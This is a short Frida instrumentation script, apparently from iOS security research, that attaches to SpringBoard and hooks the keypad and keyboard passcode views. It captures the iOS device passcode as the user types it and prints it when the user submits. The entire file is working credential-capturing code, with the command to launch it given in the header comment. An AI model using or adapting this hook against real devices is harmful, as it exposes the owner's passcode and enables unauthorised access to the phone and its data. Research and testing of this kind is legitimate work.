/**
*
* Frida hook to capture iOS device's passcode when user submit it.
* You need to attach to SpringBoard to do so:
* frida -U -n SpringBoard -l ios_springboard_passcode.js
*
* @Author: Quentin Kaiser <kaiserquentin@gmail.com>
*
*/
var device_passcode = "";

var keypad_passcode = ObjC.classes.SBUIPasscodeLockViewWithKeypad["- passcode"];
Interceptor.attach(keypad_passcode.implementation, {
    onLeave: function(retval) {
        var cur_passcode = new ObjC.Object(retval).toString();
        if(cur_passcode.length > 0){
            device_passcode = cur_passcode;
        } else {
            // user pressed submit, time to print out the passcode
            console.log("[!] Device passcode is " + device_passcode);
        }
    }
});

var keyboard_passcode = ObjC.classes.SBUIPasscodeLockViewWithKeyboard["- passcode"];
Interceptor.attach(keyboard_passcode.implementation, {
    onLeave: function(retval) {
        var cur_passcode = new ObjC.Object(retval).toString();
        if(cur_passcode.length > 0){
            device_passcode = cur_passcode;
        } else {
            // user pressed submit, time to print out the passcode
            console.log("[!] Device passcode is " + device_passcode);
        }
    }
});
